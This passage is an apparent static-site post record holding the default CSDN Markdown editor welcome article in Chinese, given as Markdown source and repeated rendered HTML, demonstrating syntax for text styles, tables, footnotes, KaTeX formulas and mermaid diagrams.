全新的 **KaTeX数学公式** 语法；\n 5. 增加了支持**甘特图的mermaid语法[^1]** 功能；\n 6. 增加了 **多屏幕编辑** Markdown文章功能；\n 7. 增加了 **焦点写作模式、预览模式、简洁写作模式、左右区域同步滚轮设置** 等功能，功能按钮位于编辑区域与预览区域中间；\n 8. 增加了 **检查列表** 功能。\n [^1]: [mermaid语法说明](https://mermaidjs.github.io/)\n\n## 功能快捷键\n\n撤销：<kbd>Ctrl/Command</kbd> + <kbd>Z</kbd>\n重做：<kbd>Ctrl/Command</kbd> + <kbd>Y</kbd>\n加粗：<kbd>Ctrl/Command</kbd> + <kbd>B</kbd>\n斜体：<kbd>Ctrl/Command</kbd> + <kbd>I</kbd>\n标题：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>H</kbd>\n无序列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>U</kbd>\n有序列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>O</kbd>\n检查列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>C</kbd>\n插入代码：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>K</kbd>\n插入链接：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>L</kbd>\n插入图片：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>G</kbd>\n查找：<kbd>Ctrl/Command</kbd> + <kbd>F</kbd>\n替换：<kbd>Ctrl/Command</kbd> + <kbd>G</kbd>\n\n## 合理的创建标题，有助于目录的生成\n\n直接输入1次<kbd>#</kbd>，并按下<kbd>space</kbd>后，将生成1级标题。\n输入2次<kbd>#</kbd>，并按下<kbd>space</kbd>后，将生成2级标题。\n以此类推，我们支持6级标题。有助于使用`TOC`语法后生成一个完美的目录。\n\n## 如何改变文本的样式\n\n*强调文本* _强调文本_\n\n**加粗文本** __加粗文本__\n\n==标记文本==\n\n~~删除文本~~\n\n> 引用文本\n\nH~2~O is是液体。\n\n2^10^ 运算结果是 1024.\n\n## 插入链接与图片\n\n链接: [link](https://www.csdn.net/).\n\n图片: ![Alt](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw)\n\n带尺寸的图片: ![Alt](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw =30x30)\n\n居中的图片: ![Alt](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw#pic_center)\n\n居中并且带尺寸的图片: ![Alt](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw#pic_center =30x30)\n\n当然，我们为了让用户更加便捷，我们增加了图片拖拽功能。\n\n## 如何插入一段漂亮的代码片\n\n去[博客设置](https://mp.csdn.net/console/configBlog)页面，选择一款你喜欢的代码片高亮样式，下面展示同样高亮的 `代码片`.\n```javascript\n// An highlighted block\nvar foo = 'bar';\n```\n\n## 生成一个适合你的列表\n\n- 项目\n  - 项目\n    - 项目\n\n1. 项目1\n2. 项目2\n3. 项目3\n\n- [ ] 计划任务\n- [x] 完成任务\n\n## 创建一个表格\n一个简单的表格是这么创建的：\n项目     | Value\n-------- | -----\n电脑  | $1600\n手机  | $12\n导管  | $1\n\n### 设定内容居中、居左、居右\n使用`:---------:`居中\n使用`:----------`居左\n使用`----------:`居右\n| 第一列       | 第二列         | 第三列        |\n|:-----------:| -------------:|:-------------|\n| 第一列文本居中 | 第二列文本居右  | 第三列文本居左 |\n\n### SmartyPants\nSmartyPants将ASCII标点字符转换为“智能”印刷标点HTML实体。例如：\n|    TYPE   |ASCII                          |HTML\n|----------------|-------------------------------|-----------------------------|\n|Single backticks|`'Isn't this fun?'`            |'Isn't this fun?'            |\n|Quotes          |`\"Isn't this fun?\"`            |\"Isn't this fun?\"            |\n|Dashes          |`-- is en-dash, --- is em-dash`|-- is en-dash, --- is em-dash|\n\n## 创建一个自定义列表\nMarkdown\n:  Text-to-HTML conversion tool\n\nAuthors\n:  John\n:  Luke\n\n## 如何创建一个注脚\n\n一个具有注脚的文本。[^2]\n\n[^2]: 注脚的解释\n\n##  注释也是必不可少的\n\nMarkdown将文本转换为 HTML。\n\n*[HTML]:   超文本标记语言\n\n## KaTeX数学公式\n\n您可以使用渲染LaTeX数学表达式 [KaTeX](https://khan.github.io/KaTeX/):\n\nGamma公式展示 $\\Gamma(n) = (n-1)!\\quad\\forall\nn\\in\\mathbb N$ 是通过欧拉积分\n\n$$\n\\Gamma(z) = \\int_0^\\infty t^{z-1}e^{-t}dt\\,.\n$$\n\n> 你可以找到更多关于的信息 **LaTeX** 数学表达式[here][1].\n\n## 新的甘特图功能，丰富你的文章\n\n```mermaid\ngantt\n        dateFormat  YYYY-MM-DD\n        title Adding GANTT diagram functionality to mermaid\n        section 现有任务\n        已完成               :done,    des1, 2014-01-06,2014-01-08\n        进行中               :active,  des2, 2014-01-09, 3d\n        计划一               :         des3, after des2, 5d\n        计划二               :         des4, after des3, 5d\n```\n- 关于 **甘特图** 语法，参考 [这儿][2],\n\n## UML 图表\n\n可以使用UML图表进行渲染。 [Mermaid](https://mermaidjs.github.io/). 例如下面产生的一个序列图：\n\n```mermaid\nsequenceDiagram\n张三 ->> 李四: 你好！李四, 最近怎么样?\n李四-->>王五: 你最近怎么样，王五？\n李四--x 张三: 我很好，谢谢!\n李四-x 王五: 我很好，谢谢!\nNote right of 王五: 李四想了很长时间, 文字太长了<br/>不适合放在一行.\n\n李四-->>张三: 打量着王五...\n张三->>王五: 很好... 王五, 你怎么样?\n```\n\n这将产生一个流程图。:\n\n```mermaid\ngraph LR\nA[长方形] -- 链接 --> B((圆))\nA --> C(圆角长方形)\nB --> D{菱形}\nC --> D\n```\n\n- 关于 **Mermaid** 语法，参考 [这儿][3],\n\n## FLowchart流程图\n\n我们依旧会支持flowchart的流程图：\n```mermaid\nflowchat\nst=>start: 开始\ne=>end: 结束\nop=>operation: 我的操作\ncond=>condition: 确认？\n\nst->op->cond\ncond(yes)->e\ncond(no)->op\n```\n\n- 关于 **Flowchart流程图** 语法，参考 [这儿][4].\n\n## 导出与导入\n\n###  导出\n如果你想尝试使用此编辑器, 你可以在此篇文章任意编辑。当你完成了一篇文章的写作, 在上方工具栏找到 **文章导出** ，生成一个.md文件或者.html文件进行本地保存。\n\n### 导入\n如果你想加载一篇你写过的.md文件，在上方工具栏可以选择导入功能进行对应扩展名的文件导入，\n继续你的创作。\n\n [1]: http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference\n [2]: https://mermaidjs.github.io/\n [3]: https://mermaidjs.github.io/\n [4]: http://adrai.github.io/flowchart.js/\n","slug":"欢迎使用CSDN-markdown编辑器","published":1,"updated":"2023-03-27T12:01:21.947Z","_id":"clg29vyia006uao9c0s7ycy51","comments":1,"layout":"post","photos":[],"link":"","content":"<p>@<a href=\"%E8%BF%99%E9%87%8C%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98\">TOC</a></p>\n<h1 id=\"欢迎使用Markdown编辑器\"><a href=\"#欢迎使用Markdown编辑器\" class=\"headerlink\" title=\"欢迎使用Markdown编辑器\"></a>欢迎使用Markdown编辑器</h1><p>你好！ 这是你第一次使用 <strong>Markdown编辑器</strong> 所展示的欢迎页。如果你想学习如何使用Markdown编辑器, 可以仔细阅读这篇文章，了解一下Markdown的基本语法知识。</p>\n<h2 id=\"新的改变\"><a href=\"#新的改变\" class=\"headerlink\" title=\"新的改变\"></a>新的改变</h2><p>对Markdown编辑器进行了一些功能拓展与语法支持，除了标准的Markdown编辑器功能，我们增加了如下几点新功能，帮助你用它写博客：</p>\n<ol>\n<li><strong>全新的界面设计</strong> ，将会带来全新的写作体验；</li>\n<li>在创作中心设置你喜爱的代码高亮样式，Markdown <strong>将代码片显示选择的高亮样式</strong> 进行展示；</li>\n<li>增加了 <strong>图片拖拽</strong> 功能，你可以将本地的图片直接拖拽到编辑区域直接展示；</li>\n<li>全新的 <strong>KaTeX数学公式</strong> 语法；</li>\n<li>增加了支持<strong>甘特图的mermaid语法<sup id=\"fnref:1\" class=\"footnote-ref\"><a href=\"#fn:1\" rel=\"footnote\"><span class=\"hint--top hint--rounded\" aria-label=\"[mermaid语法说明](https://mermaidjs.github.io/)\"><a href=\"http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference\">1</a></span></a></sup></strong> 功能；</li>\n<li>增加了 <strong>多屏幕编辑</strong> Markdown文章功能；</li>\n<li>增加了 <strong>焦点写作模式、预览模式、简洁写作模式、左右区域同步滚轮设置</strong> 等功能，功能按钮位于编辑区域与预览区域中间；</li>\n<li>增加了 <strong>检查列表</strong> 功能。</li>\n</ol>\n<h2 id=\"功能快捷键\"><a href=\"#功能快捷键\" class=\"headerlink\" title=\"功能快捷键\"></a>功能快捷键</h2><p>撤销：<kbd>Ctrl/Command</kbd> + <kbd>Z</kbd><br>重做：<kbd>Ctrl/Command</kbd> + <kbd>Y</kbd><br>加粗：<kbd>Ctrl/Command</kbd> + <kbd>B</kbd><br>斜体：<kbd>Ctrl/Command</kbd> + <kbd>I</kbd><br>标题：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>H</kbd><br>无序列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>U</kbd><br>有序列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>O</kbd><br>检查列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>C</kbd><br>插入代码：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>K</kbd><br>插入链接：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>L</kbd><br>插入图片：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>G</kbd><br>查找：<kbd>Ctrl/Command</kbd> + <kbd>F</kbd><br>替换：<kbd>Ctrl/Command</kbd> + <kbd>G</kbd></p>\n<h2 id=\"合理的创建标题，有助于目录的生成\"><a href=\"#合理的创建标题，有助于目录的生成\" class=\"headerlink\" title=\"合理的创建标题，有助于目录的生成\"></a>合理的创建标题，有助于目录的生成</h2><p>直接输入1次<kbd>#</kbd>，并按下<kbd>space</kbd>后，将生成1级标题。<br>输入2次<kbd>#</kbd>，并按下<kbd>space</kbd>后，将生成2级标题。<br>以此类推，我们支持6级标题。有助于使用<code>TOC</code>语法后生成一个完美的目录。</p>\n<h2 id=\"如何改变文本的样式\"><a href=\"#如何改变文本的样式\" class=\"headerlink\" title=\"如何改变文本的样式\"></a>如何改变文本的样式</h2><p><em>强调文本</em> <em>强调文本</em></p>\n<p><strong>加粗文本</strong> <strong>加粗文本</strong></p>\n<p>==标记文本==</p>\n<p><del>删除文本</del></p>\n<blockquote>\n<p>引用文本</p>\n</blockquote>\n<p>H<del>2</del>O is是液体。</p>\n<p>2^10^ 运算结果是 1024.</p>\n<h2 id=\"插入链接与图片\"><a href=\"#插入链接与图片\" class=\"headerlink\" title=\"插入链接与图片\"></a>插入链接与图片</h2><p>链接: <a href=\"https://www.csdn.net/\">link</a>.</p>\n<p>图片: <img src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw\" alt=\"Alt\"></p>\n<p>带尺寸的图片: ![Alt](<a href=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw\">https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw</a> =30x30)</p>\n<p>居中的图片: <img src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw#pic_center\" alt=\"Alt\"></p>\n<p>居中并且带尺寸的图片: ![Alt](<a href=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw#pic_center\">https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw#pic_center</a> =30x30)</p>\n<p>当然，我们为了让用户更加便捷，我们增加了图片拖拽功能。</p>\n<h2 id=\"如何插入一段漂亮的代码片\"><a href=\"#如何插入一段漂亮的代码片\" class=\"headerlink\" title=\"如何插入一段漂亮的代码片\"></a>如何插入一段漂亮的代码片</h2><p>去<a href=\"https://mp.csdn.net/console/configBlog\">博客设置</a>页面，选择一款你喜欢的代码片高亮样式，下面展示同样高亮的 <code>代码片</code>.</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// An highlighted block</span><br><span class=\"hljs-keyword\">var</span> foo = <span class=\"hljs-string\">&#x27;bar&#x27;</span>;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"生成一个适合你的列表\"><a href=\"#生成一个适合你的列表\" class=\"headerlink\" title=\"生成一个适合你的列表\"></a>生成一个适合你的列表</h2><ul>\n<li>项目<ul>\n<li>项目<ul>\n<li>项目</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<ol>\n<li>项目1</li>\n<li>项目2</li>\n<li>项目3</li>\n</ol>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 计划任务</li>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> 完成任务</li>\n</ul>\n<h2 id=\"创建一个表格\"><a href=\"#创建一个表格\" class=\"headerlink\" title=\"创建一个表格\"></a>创建一个表格</h2><p>一个简单的表格是这么创建的：<br>项目     | Value<br>——– | —–<br>电脑  | $1600<br>手机  | $12<br>导管  | $1</p>\n<h3 id=\"设定内容居中、居左、居右\"><a href=\"#设定内容居中、居左、居右\" class=\"headerlink\" title=\"设定内容居中、居左、居右\"></a>设定内容居中、居左、居右</h3><p>使用<code>:---------:</code>居中<br>使用<code>:----------</code>居左<br>使用<code>----------:</code>居右<br>| 第一列       | 第二列         | 第三列        |<br>|:———–:| ————-:|:————-|<br>| 第一列文本居中 | 第二列文本居右  | 第三列文本居左 |</p>\n<h3 id=\"SmartyPants\"><a href=\"#SmartyPants\" class=\"headerlink\" title=\"SmartyPants\"></a>SmartyPants</h3><p>SmartyPants将ASCII标点字符转换为“智能”印刷标点HTML实体。例如：<br>|    TYPE   |ASCII                          |HTML<br>|—————-|——————————-|—————————–|<br>|Single backticks|<code>&#39;Isn&#39;t this fun?&#39;</code>            |’Isn’t this fun?’            |<br>|Quotes          |<code>&quot;Isn&#39;t this fun?&quot;</code>            |”Isn’t this fun?”            |<br>|Dashes          |<code>-- is en-dash, --- is em-dash</code>|– is en-dash, — is em-dash|</p>\n<h2 id=\"创建一个自定义列表\"><a href=\"#创建一个自定义列表\" class=\"headerlink\" title=\"创建一个自定义列表\"></a>创建一个自定义列表</h2><dl><dt>Markdown</dt><dd>Text-to-HTML conversion tool</dd></dl><dl><dt>Authors<br>:  John</dt><dd>Luke</dd></dl><h2 id=\"如何创建一个注脚\"><a href=\"#如何创建一个注脚\" class=\"headerlink\" title=\"如何创建一个注脚\"></a>如何创建一个注脚</h2><p>一个具有注脚的文本。<sup id=\"fnref:2\" class=\"footnote-ref\"><a href=\"#fn:2\" rel=\"footnote\"><span class=\"hint--top hint--rounded\" aria-label=\"注脚的解释\"><a href=\"https://mermaidjs.github.io/\">2</a></span></a></sup></p>\n<h2 id=\"注释也是必不可少的\"><a href=\"#注释也是必不可少的\" class=\"headerlink\" title=\"注释也是必不可少的\"></a>注释也是必不可少的</h2><p>Markdown将文本转换为 HTML。</p>\n<p>*[HTML]:   超文本标记语言</p>\n<h2 id=\"KaTeX数学公式\"><a href=\"#KaTeX数学公式\" class=\"headerlink\" title=\"KaTeX数学公式\"></a>KaTeX数学公式</h2><p>您可以使用渲染LaTeX数学表达式 <a href=\"https://khan.github.io/KaTeX/\">KaTeX</a>:</p>\n<p>Gamma公式展示 $\\Gamma(n) = (n-1)!\\quad\\forall<br>n\\in\\mathbb N$ 是通过欧拉积分</p>\n<p>$$<br>\\Gamma(z) = \\int_0^\\infty t^{z-1}e^{-t}dt,.<br>$$</p>\n<blockquote>\n<p>你可以找到更多关于的信息 <strong>LaTeX</strong> 数学表达式<a href=\"http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference\">here</a>.</p>\n</blockquote>\n<h2 id=\"新的甘特图功能，丰富你的文章\"><a href=\"#新的甘特图功能，丰富你的文章\" class=\"headerlink\" title=\"新的甘特图功能，丰富你的文章\"></a>新的甘特图功能，丰富你的文章</h2><pre><code class=\" mermaid\">gantt\n        dateFormat  YYYY-MM-DD\n        title Adding GANTT diagram functionality to mermaid\n        section 现有任务\n        已完成               :done,    des1, 2014-01-06,2014-01-08\n        进行中               :active,  des2, 2014-01-09, 3d\n        计划一               :         des3, after des2, 5d\n        计划二               :         des4, after des3, 5d\n</code></pre>\n<ul>\n<li>关于 <strong>甘特图</strong> 语法，参考 <a href=\"https://mermaidjs.github.io/\">这儿</a>,</li>\n</ul>\n<h2 id=\"UML-图表\"><a href=\"#UML-图表\" class=\"headerlink\" title=\"UML 图表\"></a>UML 图表</h2><p>可以使用UML图表进行渲染。 <a href=\"https://mermaidjs.github.io/\">Mermaid</a>. 例如下面产生的一个序列图：</p>\n<pre><code class=\" mermaid\">sequenceDiagram\n张三 -&gt;&gt; 李四: 你好！李四, 最近怎么样?\n李四--&gt;&gt;王五: 你最近怎么样，王五？\n李四--x 张三: 我很好，谢谢!\n李四-x 王五: 我很好，谢谢!\nNote right of 王五: 李四想了很长时间, 文字太长了&lt;br/&gt;不适合放在一行.\n\n李四--&gt;&gt;张三: 打量着王五...\n张三-&gt;&gt;王五: 很好... 王五, 你怎么样?\n</code></pre>\n\n<p>这将产生一个流程图。:</p>\n<pre><code class=\" mermaid\">graph LR\nA[长方形] -- 链接 --&gt; B((圆))\nA --&gt; C(圆角长方形)\nB --&gt; D&#123;菱形&#125;\nC --&gt; D\n</code></pre>\n\n<ul>\n<li>关于 <strong>Mermaid</strong> 语法，参考 <a href=\"https://mermaidjs.github.io/\">这儿</a>,</li>\n</ul>\n<h2 id=\"FLowchart流程图\"><a href=\"#FLowchart流程图\" class=\"headerlink\" title=\"FLowchart流程图\"></a>FLowchart流程图</h2><p>我们依旧会支持flowchart的流程图：</p>\n<pre><code class=\" mermaid\">flowchat\nst=&gt;start: 开始\ne=&gt;end: 结束\nop=&gt;operation: 我的操作\ncond=&gt;condition: 确认？\n\nst-&gt;op-&gt;cond\ncond(yes)-&gt;e\ncond(no)-&gt;op\n</code></pre>\n\n<ul>\n<li>关于 <strong>Flowchart流程图</strong> 语法，参考 <a href=\"http://adrai.github.io/flowchart.js/\">这儿</a>.</li>\n</ul>\n<h2 id=\"导出与导入\"><a href=\"#导出与导入\" class=\"headerlink\" title=\"导出与导入\"></a>导出与导入</h2><h3 id=\"导出\"><a href=\"#导出\" class=\"headerlink\" title=\"导出\"></a>导出</h3><p>如果你想尝试使用此编辑器, 你可以在此篇文章任意编辑。当你完成了一篇文章的写作, 在上方工具栏找到 <strong>文章导出</strong> ，生成一个.md文件或者.html文件进行本地保存。</p>\n<h3 id=\"导入\"><a href=\"#导入\" class=\"headerlink\" title=\"导入\"></a>导入</h3><p>如果你想加载一篇你写过的.md文件，在上方工具栏可以选择导入功能进行对应扩展名的文件导入，<br>继续你的创作。</p>\n<section class=\"footnotes\"><div class=\"footnote-list\"><ol><li><span id=\"fn:1\" class=\"footnote-text\"><span><a href=\"https://mermaidjs.github.io/\">mermaid语法说明</a>\n<a href=\"#fnref:1\" rev=\"footnote\" class=\"footnote-backref\"> ↩</a></span></span></li><li><span id=\"fn:2\" class=\"footnote-text\"><span>注脚的解释\n<a href=\"#fnref:2\" rev=\"footnote\" class=\"footnote-backref\"> ↩</a></span></span></li></ol></div></section>","site":{"data":{}},"excerpt":"","more":"<p>@<a href=\"%E8%BF%99%E9%87%8C%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98\">TOC</a></p>\n<h1 id=\"欢迎使用Markdown编辑器\"><a href=\"#欢迎使用Markdown编辑器\" class=\"headerlink\" title=\"欢迎使用Markdown编辑器\"></a>欢迎使用Markdown编辑器</h1><p>你好！ 这是你第一次使用 <strong>Markdown编辑器</strong> 所展示的欢迎页。如果你想学习如何使用Markdown编辑器, 可以仔细阅读这篇文章，了解一下Markdown的基本语法知识。</p>\n<h2 id=\"新的改变\"><a href=\"#新的改变\" class=\"headerlink\" title=\"新的改变\"></a>新的改变</h2><p>对Markdown编辑器进行了一些功能拓展与语法支持，除了标准的Markdown编辑器功能，我们增加了如下几点新功能，帮助你用它写博客：</p>\n<ol>\n<li><strong>全新的界面设计</strong> ，将会带来全新的写作体验；</li>\n<li>在创作中心设置你喜爱的代码高亮样式，Markdown <strong>将代码片显示选择的高亮样式</strong> 进行展示；</li>\n<li>增加了 <strong>图片拖拽</strong> 功能，你可以将本地的图片直接拖拽到编辑区域直接展示；</li>\n<li>全新的 <strong>KaTeX数学公式</strong> 语法；</li>\n<li>增加了支持<strong>甘特图的mermaid语法<sup id=\"fnref:1\" class=\"footnote-ref\"><a href=\"#fn:1\" rel=\"footnote\"><span class=\"hint--top hint--rounded\" aria-label=\"[mermaid语法说明](https://mermaidjs.github.io/)\"><a href=\"http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference\">1</a></span></a></sup></strong> 功能；</li>\n<li>增加了 <strong>多屏幕编辑</strong> Markdown文章功能；</li>\n<li>增加了 <strong>焦点写作模式、预览模式、简洁写作模式、左右区域同步滚轮设置</strong> 等功能，功能按钮位于编辑区域与预览区域中间；</li>\n<li>增加了 <strong>检查列表</strong> 功能。</li>\n</ol>\n<h2 id=\"功能快捷键\"><a href=\"#功能快捷键\" class=\"headerlink\" title=\"功能快捷键\"></a>功能快捷键</h2><p>撤销：<kbd>Ctrl/Command</kbd> + <kbd>Z</kbd><br>重做：<kbd>Ctrl/Command</kbd> + <kbd>Y</kbd><br>加粗：<kbd>Ctrl/Command</kbd> + <kbd>B</kbd><br>斜体：<kbd>Ctrl/Command</kbd> + <kbd>I</kbd><br>标题：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>H</kbd><br>无序列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>U</kbd><br>有序列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>O</kbd><br>检查列表：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>C</kbd><br>插入代码：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>K</kbd><br>插入链接：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>L</kbd><br>插入图片：<kbd>Ctrl/Command</kbd> + <kbd>Shift</kbd> + <kbd>G</kbd><br>查找：<kbd>Ctrl/Command</kbd> + <kbd>F</kbd><br>替换：<kbd>Ctrl/Command</kbd> + <kbd>G</kbd></p>\n<h2 id=\"合理的创建标题，有助于目录的生成\"><a href=\"#合理的创建标题，有助于目录的生成\" class=\"headerlink\" title=\"合理的创建标题，有助于目录的生成\"></a>合理的创建标题，有助于目录的生成</h2><p>直接输入1次<kbd>#</kbd>，并按下<kbd>space</kbd>后，将生成1级标题。<br>输入2次<kbd>#</kbd>，并按下<kbd>space</kbd>后，将生成2级标题。<br>以此类推，我们支持6级标题。有助于使用<code>TOC</code>语法后生成一个完美的目录。</p>\n<h2 id=\"如何改变文本的样式\"><a href=\"#如何改变文本的样式\" class=\"headerlink\" title=\"如何改变文本的样式\"></a>如何改变文本的样式</h2><p><em>强调文本</em> <em>强调文本</em></p>\n<p><strong>加粗文本</strong> <strong>加粗文本</strong></p>\n<p>==标记文本==</p>\n<p><del>删除文本</del></p>\n<blockquote>\n<p>引用文本</p>\n</blockquote>\n<p>H<del>2</del>O is是液体。</p>\n<p>2^10^ 运算结果是 1024.</p>\n<h2 id=\"插入链接与图片\"><a href=\"#插入链接与图片\" class=\"headerlink\" title=\"插入链接与图片\"></a>插入链接与图片</h2><p>链接: <a href=\"https://www.csdn.net/\">link</a>.</p>\n<p>图片: <img src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw\" alt=\"Alt\"></p>\n<p>带尺寸的图片: ![Alt](<a href=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw\">https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw</a> =30x30)</p>\n<p>居中的图片: <img src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw#pic_center\" alt=\"Alt\"></p>\n<p>居中并且带尺寸的图片: ![Alt](<a href=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw#pic_center\">https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw#pic_center</a> =30x30)</p>\n<p>当然，我们为了让用户更加便捷，我们增加了图片拖拽功能。</p>\n<h2 id=\"如何插入一段漂亮的代码片\"><a href=\"#如何插入一段漂亮的代码片\" class=\"headerlink\" title=\"如何插入一段漂亮的代码片\"></a>如何插入一段漂亮的代码片</h2><p>去<a href=\"https://mp.csdn.net/console/configBlog\">博客设置</a>页面，选择一款你喜欢的代码片高亮样式，下面展示同样高亮的 <code>代码片</code>.</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// An highlighted block</span><br><span class=\"hljs-keyword\">var</span> foo = <span class=\"hljs-string\">&#x27;bar&#x27;</span>;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"生成一个适合你的列表\"><a href=\"#生成一个适合你的列表\" class=\"headerlink\" title=\"生成一个适合你的列表\"></a>生成一个适合你的列表</h2><ul>\n<li>项目<ul>\n<li>项目<ul>\n<li>项目</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<ol>\n<li>项目1</li>\n<li>项目2</li>\n<li>项目3</li>\n</ol>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 计划任务</li>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> 完成任务</li>\n</ul>\n<h2 id=\"创建一个表格\"><a href=\"#创建一个表格\" class=\"headerlink\" title=\"创建一个表格\"></a>创建一个表格</h2><p>一个简单的表格是这么创建的：<br>项目     | Value<br>——– | —–<br>电脑  | $1600<br>手机  | $12<br>导管  | $1</p>\n<h3 id=\"设定内容居中、居左、居右\"><a href=\"#设定内容居中、居左、居右\" class=\"headerlink\" title=\"设定内容居中、居左、居右\"></a>设定内容居中、居左、居右</h3><p>使用<code>:---------:</code>居中<br>使用<code>:----------</code>居左<br>使用<code>----------:</code>居右<br>| 第一列       | 第二列         | 第三列        |<br>|:———–:| ————-:|:————-|<br>| 第一列文本居中 | 第二列文本居右  | 第三列文本居左 |</p>\n<h3 id=\"SmartyPants\"><a href=\"#SmartyPants\" class=\"headerlink\" title=\"SmartyPants\"></a>SmartyPants</h3><p>SmartyPants将ASCII标点字符转换为“智能”印刷标点HTML实体。例如：<br>|    TYPE   |ASCII                          |HTML<br>|—————-|——————————-|—————————–|<br>|Single backticks|<code>&#39;Isn&#39;t this fun?&#39;</code>            |’Isn’t this fun?’            |<br>|Quotes          |<code>&quot;Isn&#39;t this fun?&quot;</code>            |”Isn’t this fun?”            |<br>|Dashes          |<code>-- is en-dash, --- is em-dash</code>|– is en-dash, — is em-dash|</p>\n<h2 id=\"创建一个自定义列表\"><a href=\"#创建一个自定义列表\" class=\"headerlink\" title=\"创建一个自定义列表\"></a>创建一个自定义列表</h2><dl><dt>Markdown</dt><dd>Text-to-HTML conversion tool</dd></dl><dl><dt>Authors<br>:  John</dt><dd>Luke</dd></dl><h2 id=\"如何创建一个注脚\"><a href=\"#如何创建一个注脚\" class=\"headerlink\" title=\"如何创建一个注脚\"></a>如何创建一个注脚</h2><p>一个具有注脚的文本。<sup id=\"fnref:2\" class=\"footnote-ref\"><a href=\"#fn:2\" rel=\"footnote\"><span class=\"hint--top hint--rounded\" aria-label=\"注脚的解释\"><a href=\"https://mermaidjs.github.io/\">2</a></span></a></sup></p>\n<h2 id=\"注释也是必不可少的\"><a 